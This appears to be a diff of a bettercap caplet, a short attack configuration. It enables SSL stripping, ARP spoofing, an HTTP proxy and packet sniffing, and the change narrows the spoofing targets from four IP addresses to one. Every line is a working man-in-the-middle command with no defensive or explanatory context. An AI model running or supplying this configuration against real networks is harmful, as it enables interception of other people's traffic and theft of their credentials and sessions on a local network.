@@ -1,6 +1,6 @@
 set http.proxy.sslstrip true
 set net.sniff.verbose false
-set arp.spoof.targets 192.168.1.6, 114.246.169.186, 10.211.55.7, 192.168.1.5
+set arp.spoof.targets 10.211.55.7
 arp.spoof on
 http.proxy on
 net.sniff on
